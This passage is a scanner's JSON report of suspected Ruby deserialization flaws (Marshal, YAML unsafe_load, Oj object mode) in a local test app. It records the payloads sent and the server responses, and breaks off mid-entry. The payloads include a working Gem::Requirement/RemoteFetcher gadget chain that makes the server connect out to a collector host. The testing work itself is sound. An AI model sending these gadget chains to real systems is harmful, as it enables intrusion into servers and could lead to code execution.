@@ -1,0 +1,721 @@
+{
+    "target": "localhost:8085",
+    "disclaimer": "All findings are Suspected — the tool flags candidates and never auto-confirms; verify each manually.",
+    "stats": {
+        "vectors_scanned": 13,
+        "after_filter": 8,
+        "findings": 8,
+        "dynamic_strong": 5,
+        "oob": {
+            "status": "ran",
+            "collector": "http://172.27.32.1:9000",
+            "base_domain": "oob.test",
+            "tokens_polled": 8,
+            "confirmed": 2
+        }
+    },
+    "findings": [
+        {
+            "url": "http://localhost:8085/api/dashboard",
+            "method": "GET",
+            "location": "cookie",
+            "name": "session",
+            "occurrences": 1,
+            "oob_token": "854e94d2a524",
+            "type": "Ruby",
+            "subtype": null,
+            "confidence": "Medium",
+            "exploit_type": "Ruby Marshal Deserialization",
+            "suggested_probe": "ruby_marshal",
+            "severity": "High",
+            "severity_note": null,
+            "evidence": "dynamic-strong",
+            "notes": "Ruby Marshal stream detected by Fingerprint stage (suspected) | Try Marshal-based gadget chain (e.g. via a ruby -e helper script)",
+            "normalized": [
+                "\u0004\bo:\tUser\u0007:\u000e@usernameI\"\u000bwiener\u0006:\u0006ET:\u000b@adminF"
+            ],
+            "mutations_count": 3,
+            "indicators": [
+                "Observation: response length changed by +1 bytes (baseline=253 mutated=254, same status 200) — possible behavioral change, verify manually",
+                "Response content differs in a small, localized way despite same status (similarity=0.98) (baseline='{\"username\":\"wiener\",\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Ruby edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New' mutated='{\"username\":\"unknown\",\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Ruby edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"Ne')"
+            ],
+            "attempts": [
+                {
+                    "payload_type": "ruby_marshal",
+                    "chain": "Marshal.dump helper",
+                    "payload": "BAhvOgtPYmplY3QGOglAY21kSSIHaWQGOgZFVA==",
+                    "signal": "strong",
+                    "indicators": [
+                        "Observation: response length changed by +1 bytes (baseline=253 mutated=254, same status 200) — possible behavioral change, verify manually",
+                        "Response content differs in a small, localized way despite same status (similarity=0.98) (baseline='{\"username\":\"wiener\",\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Ruby edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New' mutated='{\"username\":\"unknown\",\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Ruby edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"Ne')"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 253,
+                        "body_sample": "{\"username\":\"wiener\",\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Ruby edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a known device.\",\"time\":\"3 days ago\"}]}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 254,
+                        "body_sample": "{\"username\":\"unknown\",\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Ruby edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a known device.\",\"time\":\"3 days ago\"}]}"
+                    }
+                },
+                {
+                    "payload_type": "ruby_marshal",
+                    "chain": "Marshal.dump helper",
+                    "payload": "BAhvOgtPYmplY3QGOglAY21kSSILd2hvYW1pBjoGRVQ=",
+                    "signal": "strong",
+                    "indicators": [
+                        "Observation: response length changed by +1 bytes (baseline=253 mutated=254, same status 200) — possible behavioral change, verify manually",
+                        "Response content differs in a small, localized way despite same status (similarity=0.98) (baseline='{\"username\":\"wiener\",\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Ruby edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New' mutated='{\"username\":\"unknown\",\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Ruby edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"Ne')"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 253,
+                        "body_sample": "{\"username\":\"wiener\",\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Ruby edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a known device.\",\"time\":\"3 days ago\"}]}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 254,
+                        "body_sample": "{\"username\":\"unknown\",\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Ruby edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a known device.\",\"time\":\"3 days ago\"}]}"
+                    }
+                },
+                {
+                    "payload_type": "ruby_marshal",
+                    "chain": "Marshal.dump helper",
+                    "payload": "BAhvOgtPYmplY3QGOglAY21kSSINaG9zdG5hbWUGOgZFVA==",
+                    "signal": "strong",
+                    "indicators": [
+                        "Observation: response length changed by +1 bytes (baseline=253 mutated=254, same status 200) — possible behavioral change, verify manually",
+                        "Response content differs in a small, localized way despite same status (similarity=0.98) (baseline='{\"username\":\"wiener\",\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Ruby edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New' mutated='{\"username\":\"unknown\",\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Ruby edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"Ne')"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 253,
+                        "body_sample": "{\"username\":\"wiener\",\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Ruby edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a known device.\",\"time\":\"3 days ago\"}]}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 254,
+                        "body_sample": "{\"username\":\"unknown\",\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Ruby edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a known device.\",\"time\":\"3 days ago\"}]}"
+                    }
+                }
+            ]
+        },
+        {
+            "url": "http://localhost:8085/api/profile",
+            "method": "GET",
+            "location": "cookie",
+            "name": "session",
+            "occurrences": 1,
+            "oob_token": "2d40b7f7b145",
+            "type": "Ruby",
+            "subtype": null,
+            "confidence": "Medium",
+            "exploit_type": "Ruby Marshal Deserialization",
+            "suggested_probe": "ruby_marshal",
+            "severity": "High",
+            "severity_note": null,
+            "evidence": "dynamic-strong",
+            "notes": "Ruby Marshal stream detected by Fingerprint stage (suspected) | Try Marshal-based gadget chain (e.g. via a ruby -e helper script)",
+            "normalized": [
+                "\u0004\bo:\tUser\u0007:\u000e@usernameI\"\u000bwiener\u0006:\u0006ET:\u000b@adminF"
+            ],
+            "mutations_count": 3,
+            "indicators": [
+                "Observation: response length changed by +2 bytes (baseline=91 mutated=93, same status 200) — possible behavioral change, verify manually",
+                "Response content differs in a small, localized way despite same status (similarity=0.90) (baseline='{\"username\":\"wiener\",\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"admin\":false}' mutated='{\"username\":\"unknown\",\"email\":\"unknown@acme-portal.test\",\"joined\":\"2025-01-15\",\"admin\":false}')"
+            ],
+            "attempts": [
+                {
+                    "payload_type": "ruby_marshal",
+                    "chain": "Marshal.dump helper",
+                    "payload": "BAhvOgtPYmplY3QGOglAY21kSSIHaWQGOgZFVA==",
+                    "signal": "strong",
+                    "indicators": [
+                        "Observation: response length changed by +2 bytes (baseline=91 mutated=93, same status 200) — possible behavioral change, verify manually",
+                        "Response content differs in a small, localized way despite same status (similarity=0.90) (baseline='{\"username\":\"wiener\",\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"admin\":false}' mutated='{\"username\":\"unknown\",\"email\":\"unknown@acme-portal.test\",\"joined\":\"2025-01-15\",\"admin\":false}')"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 91,
+                        "body_sample": "{\"username\":\"wiener\",\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"admin\":false}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 93,
+                        "body_sample": "{\"username\":\"unknown\",\"email\":\"unknown@acme-portal.test\",\"joined\":\"2025-01-15\",\"admin\":false}"
+                    }
+                },
+                {
+                    "payload_type": "ruby_marshal",
+                    "chain": "Marshal.dump helper",
+                    "payload": "BAhvOgtPYmplY3QGOglAY21kSSILd2hvYW1pBjoGRVQ=",
+                    "signal": "strong",
+                    "indicators": [
+                        "Observation: response length changed by +2 bytes (baseline=91 mutated=93, same status 200) — possible behavioral change, verify manually",
+                        "Response content differs in a small, localized way despite same status (similarity=0.90) (baseline='{\"username\":\"wiener\",\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"admin\":false}' mutated='{\"username\":\"unknown\",\"email\":\"unknown@acme-portal.test\",\"joined\":\"2025-01-15\",\"admin\":false}')"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 91,
+                        "body_sample": "{\"username\":\"wiener\",\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"admin\":false}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 93,
+                        "body_sample": "{\"username\":\"unknown\",\"email\":\"unknown@acme-portal.test\",\"joined\":\"2025-01-15\",\"admin\":false}"
+                    }
+                },
+                {
+                    "payload_type": "ruby_marshal",
+                    "chain": "Marshal.dump helper",
+                    "payload": "BAhvOgtPYmplY3QGOglAY21kSSINaG9zdG5hbWUGOgZFVA==",
+                    "signal": "strong",
+                    "indicators": [
+                        "Observation: response length changed by +2 bytes (baseline=91 mutated=93, same status 200) — possible behavioral change, verify manually",
+                        "Response content differs in a small, localized way despite same status (similarity=0.90) (baseline='{\"username\":\"wiener\",\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"admin\":false}' mutated='{\"username\":\"unknown\",\"email\":\"unknown@acme-portal.test\",\"joined\":\"2025-01-15\",\"admin\":false}')"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 91,
+                        "body_sample": "{\"username\":\"wiener\",\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"admin\":false}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 93,
+                        "body_sample": "{\"username\":\"unknown\",\"email\":\"unknown@acme-portal.test\",\"joined\":\"2025-01-15\",\"admin\":false}"
+                    }
+                }
+            ]
+        },
+        {
+            "url": "http://localhost:8085/api/import",
+            "method": "POST",
+            "location": "raw_body",
+            "name": "payload",
+            "occurrences": 1,
+            "oob_token": "e59e38c81872",
+            "type": "Ruby",
+            "subtype": null,
+            "confidence": "Medium",
+            "exploit_type": "Ruby Marshal Deserialization",
+            "suggested_probe": "ruby_marshal",
+            "severity": "High",
+            "severity_note": null,
+            "evidence": "dynamic-strong",
+            "notes": "Ruby Marshal stream detected by Fingerprint stage (suspected) | Try Marshal-based gadget chain (e.g. via a ruby -e helper script)",
+            "normalized": [
+                "\u0004\b{\u0007I\"\ntheme\u0006:\u0006ETI\"\tdark\u0006:\u0006ETI\"\tlang\u0006:\u0006ETI\"\u0007en\u0006:\u0006ET"
+            ],
+            "mutations_count": 3,
+            "indicators": [
+                "Observation: response length changed by +1 bytes (baseline=69 mutated=70, same status 200) — possible behavioral change, verify manually",
+                "Response reveals a reconstructed object of type ['Object'] not present in baseline — the server instantiated an attacker-named type (the input was deserialized)"
+            ],
+            "attempts": [
+                {
+                    "payload_type": "ruby_marshal",
+                    "chain": "Marshal.dump helper",
+                    "payload": "BAhvOgtPYmplY3QGOglAY21kSSIHaWQGOgZFVA==",
+                    "signal": "strong",
+                    "indicators": [
+                        "Observation: response length changed by +1 bytes (baseline=69 mutated=70, same status 200) — possible behavioral change, verify manually",
+                        "Response reveals a reconstructed object of type ['Object'] not present in baseline — the server instantiated an attacker-named type (the input was deserialized)"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 69,
+                        "body_sample": "{\"success\":true,\"restored\":\"{\\\"theme\\\"=>\\\"dark\\\", \\\"lang\\\"=>\\\"en\\\"}\"}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 70,
+                        "body_sample": "{\"success\":true,\"restored\":\"#<Object:0x000076baead4b3b0 @cmd=\\\"id\\\">\"}"
+                    }
+                },
+                {
+                    "payload_type": "ruby_marshal",
+                    "chain": "Marshal.dump helper",
+                    "payload": "BAhvOgtPYmplY3QGOglAY21kSSILd2hvYW1pBjoGRVQ=",
+                    "signal": "strong",
+                    "indicators": [
+                        "Observation: response length changed by +5 bytes (baseline=69 mutated=74, same status 200) — possible behavioral change, verify manually",
+                        "Response reveals a reconstructed object of type ['Object'] not present in baseline — the server instantiated an attacker-named type (the input was deserialized)"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 69,
+                        "body_sample": "{\"success\":true,\"restored\":\"{\\\"theme\\\"=>\\\"dark\\\", \\\"lang\\\"=>\\\"en\\\"}\"}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 74,
+                        "body_sample": "{\"success\":true,\"restored\":\"#<Object:0x000076baead79fd0 @cmd=\\\"whoami\\\">\"}"
+                    }
+                },
+                {
+                    "payload_type": "ruby_marshal",
+                    "chain": "Marshal.dump helper",
+                    "payload": "BAhvOgtPYmplY3QGOglAY21kSSINaG9zdG5hbWUGOgZFVA==",
+                    "signal": "strong",
+                    "indicators": [
+                        "Observation: response length changed by +7 bytes (baseline=69 mutated=76, same status 200) — possible behavioral change, verify manually",
+                        "Response reveals a reconstructed object of type ['Object'] not present in baseline — the server instantiated an attacker-named type (the input was deserialized)"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 69,
+                        "body_sample": "{\"success\":true,\"restored\":\"{\\\"theme\\\"=>\\\"dark\\\", \\\"lang\\\"=>\\\"en\\\"}\"}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 76,
+                        "body_sample": "{\"success\":true,\"restored\":\"#<Object:0x000076baeace5bc8 @cmd=\\\"hostname\\\">\"}"
+                    }
+                }
+            ]
+        },
+        {
+            "url": "http://localhost:8085/api/import-config",
+            "method": "POST",
+            "location": "raw_body",
+            "name": "payload",
+            "occurrences": 1,
+            "oob_token": "3235f73981ec",
+            "type": "YAML",
+            "subtype": "YAML Ruby Object Injection",
+            "confidence": "Medium",
+            "exploit_type": "YAML Ruby Object Injection",
+            "suggested_probe": "yaml_exec",
+            "severity": "High",
+            "severity_note": null,
+            "evidence": "dynamic-strong",
+            "notes": "Matched: YAML Ruby Object Injection (pattern: !ruby/object\\s*:) | Vulnerable only with an unsafe loader (yaml.load / YAML.unsafe_load / Psych object mode), not a safe_load",
+            "normalized": [
+                "--- !ruby/object:OpenStruct\ntable:\n  :theme: dark\n  :lang: en"
+            ],
+            "mutations_count": 4,
+            "indicators": [
+                "OOB callback received (2 hit(s)) on token 3235f73981ec — out-of-band interaction observed: the payload was deserialized and triggered an outbound lookup/request (suspected; verify manually — a callback does not by itself prove arbitrary code execution)",
+                "Observation: response length changed by -17 bytes (baseline=69 mutated=52, same status 200) — possible behavioral change, verify manually",
+                "Response content differs in a small, localized way despite same status (similarity=0.81) (baseline='{\"success\":true,\"config\":\"#<OpenStruct theme=\\\\\"dark\\\\\", lang=\\\\\"en\\\\\">\"}' mutated='{\"success\":true,\"config\":\"#<OpenStruct cmd=\\\\\"id\\\\\">\"}')"
+            ],
+            "attempts": [
+                {
+                    "payload_type": "yaml_ruby_object",
+                    "chain": "ruby/object:OpenStruct",
+                    "payload": "--- !ruby/object:OpenStruct\ntable:\n  :cmd: id\n",
+                    "signal": "strong",
+                    "indicators": [
+                        "Observation: response length changed by -17 bytes (baseline=69 mutated=52, same status 200) — possible behavioral change, verify manually",
+                        "Response content differs in a small, localized way despite same status (similarity=0.81) (baseline='{\"success\":true,\"config\":\"#<OpenStruct theme=\\\\\"dark\\\\\", lang=\\\\\"en\\\\\">\"}' mutated='{\"success\":true,\"config\":\"#<OpenStruct cmd=\\\\\"id\\\\\">\"}')"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 69,
+                        "body_sample": "{\"success\":true,\"config\":\"#<OpenStruct theme=\\\"dark\\\", lang=\\\"en\\\">\"}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 52,
+                        "body_sample": "{\"success\":true,\"config\":\"#<OpenStruct cmd=\\\"id\\\">\"}"
+                    }
+                },
+                {
+                    "payload_type": "yaml_ruby_object",
+                    "chain": "ruby/object:OpenStruct",
+                    "payload": "--- !ruby/object:OpenStruct\ntable:\n  :cmd: whoami\n",
+                    "signal": "weak",
+                    "indicators": [
+                        "Observation: response length changed by -13 bytes (baseline=69 mutated=56, same status 200) — possible behavioral change, verify manually"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 69,
+                        "body_sample": "{\"success\":true,\"config\":\"#<OpenStruct theme=\\\"dark\\\", lang=\\\"en\\\">\"}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 56,
+                        "body_sample": "{\"success\":true,\"config\":\"#<OpenStruct cmd=\\\"whoami\\\">\"}"
+                    }
+                },
+                {
+                    "payload_type": "yaml_ruby_object",
+                    "chain": "ruby/object:OpenStruct",
+                    "payload": "--- !ruby/object:OpenStruct\ntable:\n  :cmd: hostname\n",
+                    "signal": "weak",
+                    "indicators": [
+                        "Observation: response length changed by -11 bytes (baseline=69 mutated=58, same status 200) — possible behavioral change, verify manually"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 69,
+                        "body_sample": "{\"success\":true,\"config\":\"#<OpenStruct theme=\\\"dark\\\", lang=\\\"en\\\">\"}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 58,
+                        "body_sample": "{\"success\":true,\"config\":\"#<OpenStruct cmd=\\\"hostname\\\">\"}"
+                    }
+                },
+                {
+                    "payload_type": "yaml_detection_oob",
+                    "chain": "YAML Gem::Requirement->RemoteFetcher (s3) OOB",
+                    "payload": "---\n- !ruby/class 'Gem::SpecFetcher'\n- ? !ruby/object:Gem::Requirement\n    requirements:\n    - - \"~>\"\n      - !ruby/object:Gem::RequestSet::Lockfile\n        set: !ruby/object:Gem::RequestSet\n          sorted_requests:\n          - !ruby/object:Gem::Resolver::IndexSpecification\n            name: name\n            source: !ruby/object:Gem::Source\n              uri: !ruby/object:URI::HTTP\n                path: \"/\"\n                scheme: s3\n                host: \"3235f73981ec.oob.test?\"\n                port: \"any\"\n                user: any\n                password: any\n              update_cache: true\n        dependencies: []\n  : any\n",
+                    "signal": "strong",
+                    "indicators": [
+                        "Status code changed: baseline=200 mutated=500",
+                        "Response length changed significantly: baseline=69 mutated=292"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 69,
+                        "body_sample": "{\"success\":true,\"config\":\"#<OpenStruct theme=\\\"dark\\\", lang=\\\"en\\\">\"}"
+                    },
+                    "mutated": {
+                        "status": 500,
+                        "length": 292,
+                        "body_sample": "{\"error\":\"failed to load config via YAML.unsafe_load(): Errno::ECONNREFUSED: Failed to open TCP connection to 3235f73981ec.oob.test:443 (Connection refused - connect(2) for \\\"3235f73981ec.oob.test\\\" port 443) (s3://any:REDACTED@3235f73981ec.oob.test?:any/quick/Marshal.4.8/name-.gemspec.rz)\"}"
+                    }
+                }
+            ],
+            "oob_confirmed": true
+        },
+        {
+            "url": "http://localhost:8085/api/restore-prefs",
+            "method": "POST",
+            "location": "raw_body",
+            "name": "payload",
+            "occurrences": 1,
+            "oob_token": "cb55e181fc4f",
+            "type": "Ruby",
+            "subtype": "Oj Object Deserialization",
+            "confidence": "Medium",
+            "exploit_type": "Oj Object Deserialization",
+            "suggested_probe": "oj_object",
+            "severity": "High",
+            "severity_note": null,
+            "evidence": "dynamic-strong",
+            "notes": "Ruby Oj object-mode JSON (^o/^c) detected by Fingerprint stage (suspected) | Oj object-mode JSON (^o/^c) — mutate with Oj payloads, not Marshal",
+            "normalized": [
+                "{\"^o\":\"OpenStruct\",\"table\":{\":theme\":\"dark\",\":lang\":\"en\"}}"
+            ],
+            "mutations_count": 4,
+            "indicators": [
+                "OOB callback received (2 hit(s)) on token cb55e181fc4f — out-of-band interaction observed: the payload was deserialized and triggered an outbound lookup/request (suspected; verify manually — a callback does not by itself prove arbitrary code execution)",
+                "Observation: response length changed by -13 bytes (baseline=71 mutated=58, same status 200) — possible behavioral change, verify manually",
+                "Response reveals a reconstructed object of type ['Object'] not present in baseline — the server instantiated an attacker-named type (the input was deserialized)"
+            ],
+            "attempts": [
+                {
+                    "payload_type": "oj_object",
+                    "chain": "Oj ^o Object injection",
+                    "payload": "{\"^o\": \"Object\", \"@cmd\": \"id\"}",
+                    "signal": "strong",
+                    "indicators": [
+                        "Observation: response length changed by -13 bytes (baseline=71 mutated=58, same status 200) — possible behavioral change, verify manually",
+                        "Response reveals a reconstructed object of type ['Object'] not present in baseline — the server instantiated an attacker-named type (the input was deserialized)"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 71,
+                        "body_sample": "{\"success\":true,\"restored\":\"#<OpenStruct theme=\\\"dark\\\", lang=\\\"en\\\">\"}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 58,
+                        "body_sample": "{\"success\":true,\"restored\":\"#<Object:0x000076baeadb7718>\"}"
+                    }
+                },
+                {
+                    "payload_type": "oj_object",
+                    "chain": "Oj ^o Object injection",
+                    "payload": "{\"^o\": \"Object\", \"@cmd\": \"whoami\"}",
+                    "signal": "strong",
+                    "indicators": [
+                        "Observation: response length changed by -13 bytes (baseline=71 mutated=58, same status 200) — possible behavioral change, verify manually",
+                        "Response reveals a reconstructed object of type ['Object'] not present in baseline — the server instantiated an attacker-named type (the input was deserialized)"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 71,
+                        "body_sample": "{\"success\":true,\"restored\":\"#<OpenStruct theme=\\\"dark\\\", lang=\\\"en\\\">\"}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 58,
+                        "body_sample": "{\"success\":true,\"restored\":\"#<Object:0x000076baead34098>\"}"
+                    }
+                },
+                {
+                    "payload_type": "oj_object",
+                    "chain": "Oj ^o Object injection",
+                    "payload": "{\"^o\": \"Object\", \"@cmd\": \"hostname\"}",
+                    "signal": "strong",
+                    "indicators": [
+                        "Observation: response length changed by -13 bytes (baseline=71 mutated=58, same status 200) — possible behavioral change, verify manually",
+                        "Response reveals a reconstructed object of type ['Object'] not present in baseline — the server instantiated an attacker-named type (the input was deserialized)"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 71,
+                        "body_sample": "{\"success\":true,\"restored\":\"#<OpenStruct theme=\\\"dark\\\", lang=\\\"en\\\">\"}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 58,
+                        "body_sample": "{\"success\":true,\"restored\":\"#<Object:0x000076baead61a48>\"}"
+                    }
+                },
+                {
+                    "payload_type": "oj_detection_oob",
+                    "chain": "Oj Gem::Requirement->RemoteFetcher (s3) OOB",
+                    "payload": "{\"^#1\": [[{\"^c\": \"Gem::SpecFetcher\"}, {\"^o\": \"Gem::Requirement\", \"requirements\": [[\"~>\", {\"^o\": \"Gem::RequestSet::Lockfile\", \"set\": {\"^o\": \"Gem::RequestSet\", \"sorted_requests\": [{\"^o\": \"Gem::Resolver::IndexSpecification\", \"source\": {\"^o\": \"Gem::Source\", \"uri\": {\"^o\": \"URI::HTTP\", \"host\": \"cb55e181fc4f.oob.test?\", \"port\": \"any\", \"scheme\": \"s3\", \"path\": \"/\", \"user\": \"any\", \"password\": \"any\"}}}]}, \"dependencies\": []}]]}], \"any\"]}",
+                    "signal": "strong",
+                    "indicators": [
+                        "Status code changed: baseline=200 mutated=500",
+                        "Response length changed significantly: baseline=71 mutated=294"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 71,
+                        "body_sample": "{\"success\":true,\"restored\":\"#<OpenStruct theme=\\\"dark\\\", lang=\\\"en\\\">\"}"
+                    },
+                    "mutated": {
+                        "status": 500,
+                        "length": 294,
+                        "body_sample": "{\"error\":\"failed to restore prefs via Oj.load(mode: :object): Errno::ECONNREFUSED: Failed to open TCP connection to cb55e181fc4f.oob.test:443 (Connection refused - connect(2) for \\\"cb55e181fc4f.oob.test\\\" port 443) (s3://any:REDACTED@cb55e181fc4f.oob.test?:any/quick/Marshal.4.8/-.gemspec.rz)\"}"
+                    }
+                }
+            ],
+            "oob_confirmed": true
+        },
+        {
+            "url": "http://localhost:8085/api/import",
+            "method": "POST",
+            "location": "cookie",
+            "name": "session",
+            "occurrences": 1,
+            "oob_token": "f1562508b327",
+            "type": "Ruby",
+            "subtype": null,
+            "confidence": "Medium",
+            "exploit_type": "Ruby Marshal Deserialization",
+            "suggested_probe": "ruby_marshal",
+            "severity": "High",
+            "severity_note": null,
+            "evidence": "dynamic-weak",
+            "notes": "Ruby Marshal stream detected by Fingerprint stage (suspected) | Try Marshal-based gadget chain (e.g. via a ruby -e helper script)",
+            "normalized": [
+                "\u0004\bo:\tUser\u0007:\u000e@usernameI\"\u000bwiener\u0006:\u0006ET:\u000b@adminF"
+            ],
+            "mutations_count": 3,
+            "indicators": [],
+            "attempts": [
+                {
+                    "payload_type": "ruby_marshal",
+                    "chain": "Marshal.dump helper",
+                    "payload": "BAhvOgtPYmplY3QGOglAY21kSSIHaWQGOgZFVA==",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 69,
+                        "body_sample": "{\"success\":true,\"restored\":\"{\\\"theme\\\"=>\\\"dark\\\", \\\"lang\\\"=>\\\"en\\\"}\"}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 69,
+                        "body_sample": "{\"success\":true,\"restored\":\"{\\\"theme\\\"=>\\\"dark\\\", \\\"lang\\\"=>\\\"en\\\"}\"}"
+                    }
+                },
+                {
+                    "payload_type": "ruby_marshal",
+                    "chain": "Marshal.dump helper",
+                    "payload": "BAhvOgtPYmplY3QGOglAY21kSSILd2hvYW1pBjoGRVQ=",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 69,
+                        "body_sample": "{\"success\":true,\"restored\":\"{\\\"theme\\\"=>\\\"dark\\\", \\\"lang\\\"=>\\\"en\\\"}\"}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 69,
+                        "body_sample": "{\"success\":true,\"restored\":\"{\\\"theme\\\"=>\\\"dark\\\", \\\"lang\\\"=>\\\"en\\\"}\"}"
+                    }
+                },
+                {
+                    "payload_type": "ruby_marshal",
+                    "chain": "Marshal.dump helper",
+                    "payload": "BAhvOgtPYmplY3QGOglAY21kSSINaG9zdG5hbWUGOgZFVA==",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 69,
+                        "body_sample": "{\"success\":true,\"restored\":\"{\\\"theme\\\"=>\\\"dark\\\", \\\"lang\\\"=>\\\"en\\\"}\"}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 69,
+                        "body_sample": "{\"success\":true,\"restored\":\"{\\\"theme\\\"=>\\\"dark\\\", \\\"lang\\\"=>\\\"en\\\"}\"}"
+                    }
+                }
+            ]
+        },
+        {
+            "url": "http://localhost:8085/api/import-config",
+            "method": "POST",
+            "location": "cookie",
+            "name": "session",
+            "occurrences": 1,
+            "oob_token": "2cbeeb51c891",
+            "type": "Ruby",
+            "subtype": null,
+            "confidence": "Medium",
+            "exploit_type": "Ruby Marshal Deserialization",
+            "suggested_probe": "ruby_marshal",
+            "severity": "High",
+            "severity_note": null,
+            "evidence": "dynamic-weak",
+            "notes": "Ruby Marshal stream detected by Fingerprint stage (suspected) | Try Marshal-based gadget chain (e.g. via a ruby -e helper script)",
+            "normalized": [
+                "\u0004\bo:\tUser\u0007:\u000e@usernameI\"\u000bwiener\u0006:\u0006ET:\u000b@adminF"
+            ],
+            "mutations_count": 3,
+            "indicators": [],
+            "attempts": [
+                {
+                    "payload_type": "ruby_marshal",
+                    "chain": "Marshal.dump helper",
+                    "payload": "BAhvOgtPYmplY3QGOglAY21kSSIHaWQGOgZFVA==",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 69,
+                        "body_sample": "{\"success\":true,\"config\":\"#<OpenStruct theme=\\\"dark\\\", lang=\\\"en\\\">\"}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 69,
+                        "body_sample": "{\"success\":true,\"config\":\"#<OpenStruct theme=\\\"dark\\\", lang=\\\"en\\\">\"}"
+                    }
+                },
+                {
+                    "payload_type": "ruby_marshal",
+                    "chain": "Marshal.dump helper",
+                    "payload": "BAhvOgtPYmplY3QGOglAY21kSSILd2hvYW1pBjoGRVQ=",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 69,
